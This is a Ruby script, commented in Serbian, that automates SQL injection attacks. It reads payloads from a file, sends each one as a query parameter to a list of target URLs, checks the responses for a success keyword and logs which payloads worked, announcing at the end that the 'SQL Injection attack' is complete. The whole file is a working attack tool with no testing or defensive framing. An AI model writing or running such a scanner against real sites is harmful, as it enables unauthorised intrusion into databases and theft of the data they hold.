require 'net/http'
require 'uri'

# Čitanje liste SQL injection payload-a iz fajla
def read_payloads_from_file(file_path)
  payloads = []
  File.open(file_path, "r") do |file|
    file.each_line do |line|
      payloads << line.chomp
    end
  end
  payloads
end

# Detalji o metama
targets = [
  {url: 'http://example.com/vulnerable_page', param: 'id'},
  {url: 'http://testsite.com/search', param: 'query'}
]

# Putanja do fajla sa payload-ima
payloads_file = "sql_payloads.txt"

# Ključna reč za detekciju uspešnog napada
success_keyword = "specific keyword or indicator of success"

# Čitanje SQL injection payload-a
payloads = read_payloads_from_file(payloads_file)

# Otvaranje fajla za logovanje rezultata
log_file = File.open("sql_injection_log.txt", "a")

# Funkcija za logovanje rezultata
def log_result(log_file, message)
  log_file.puts(message)
  log_file.flush
end

# Napad na sve mete sa svim payload-ima
targets.each do |target|
  target_url = target[:url]
  vulnerable_param = target[:param]

  payloads.each do |payload|
    uri = URI.parse("#{target_url}?#{vulnerable_param}=#{payload}")
    response = Net::HTTP.get_response(uri)

    if response.body.include?(success_keyword)
      message = "Successful SQL Injection on #{target_url} with payload: #{payload}"
      puts message
      log_result(log_file, message)
      break
    else
      message = "Failed SQL Injection on #{target_url} with payload: #{payload}"
      puts message
      log_result(log_file, message)
    end
  end
end

log_file.close
puts "SQL Injection attack completed."
